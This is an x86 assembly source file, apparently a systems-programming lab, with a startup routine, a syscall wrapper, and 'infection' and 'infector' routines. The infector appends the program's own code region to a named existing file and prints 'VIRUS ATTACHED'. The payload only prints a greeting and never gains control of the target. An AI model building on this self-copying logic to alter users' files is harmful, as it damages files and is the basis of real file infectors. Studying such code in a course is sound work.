section .text
global _start
global system_call
extern main
_start:
    pop    dword ecx    ; ecx = argc
    mov    esi,esp      ; esi = argv
    ;; lea eax, [esi+4*ecx+4] ; eax = envp = (4*ecx)+esi+4
    mov     eax,ecx     ; put the number of arguments into eax
    shl     eax,2       ; compute the size of argv in bytes
    add     eax,esi     ; add the size to the address of argv 
    add     eax,4       ; skip NULL at the end of argv
    push    dword eax   ; char *envp[]
    push    dword esi   ; char* argv[]
    push    dword ecx   ; int argc

    call    main        ; int main( int argc, char *argv[], char *envp[] )

    mov     ebx,eax
    mov     eax,1
    int     0x80
    nop
        
system_call:
    push    ebp             ; Save caller state
    mov     ebp, esp
    sub     esp, 4          ; Leave space for local var on stack
    pushad                  ; Save some more caller state

    mov     eax, [ebp+8]    ; Copy function args to registers: leftmost...        
    mov     ebx, [ebp+12]   ; Next argument...
    mov     ecx, [ebp+16]   ; Next argument...
    mov     edx, [ebp+20]   ; Next argument...
    int     0x80            ; Transfer control to operating system
    mov     [ebp-4], eax    ; Save returned value...
    popad                   ; Restore caller state (registers)
    mov     eax, [ebp-4]    ; place returned value where caller can see it
    add     esp, 4          ; Restore caller state
    pop     ebp             ; Restore caller state
    ret                     ; Back to caller

; Only this contiguous text region is appended, including its messages.
global infection, infector, code_start, code_end
code_start:
infection:
    pushad
    mov eax, 4
    mov ebx, 1
    mov ecx, greeting
    mov edx, greeting_len
    int 0x80
    cmp eax, greeting_len
    jne attach_error
    popad
    ret

infector:
    push ebp
    mov ebp, esp
    pushad
    mov ecx, [ebp+8] ; cdecl filename, excluding the -a prefix
    xor edx, edx
.length:
    cmp byte [ecx+edx], 0
    je .print
    inc edx
    jmp .length
.print:
    mov ebx, 1
    call write_all
    mov eax, 5
    mov ebx, [ebp+8]
    mov ecx, 1 | 1024 ; O_WRONLY | O_APPEND, existing files only
    int 0x80
    test eax, eax
    js attach_error
    mov ebx, eax
    mov ecx, code_start
    mov edx, code_end-code_start
    call write_all
    mov eax, 6
    int 0x80
    test eax, eax
    js attach_error
    mov ebx, 1
    mov ecx, attached
    mov edx, attached_len
    call write_all
    popad
    leave
    ret

write_all:
    test edx, edx
    jz .done
.retry:
    mov eax, 4
    int 0x80
    cmp eax, -4
    je .retry
    test eax, eax
    jle attach_error
    add ecx, eax
    sub edx, eax
    jnz .retry
.done:
    ret
attach_error:
    mov eax, 4
    mov ebx, 2
    mov ecx, error_msg
    mov edx, error_len
    int 0x80
    mov eax, 1
    mov ebx, 0x55
    int 0x80

greeting db "Hello, Infected File", 10
greeting_len equ $-greeting
attached db " VIRUS ATTACHED", 10
attached_len equ $-attached
error_msg db "Attachment failed: output or file I/O error", 10
error_len equ $-error_msg
code_end:
section .note.GNU-stack noalloc noexec nowrite progbits
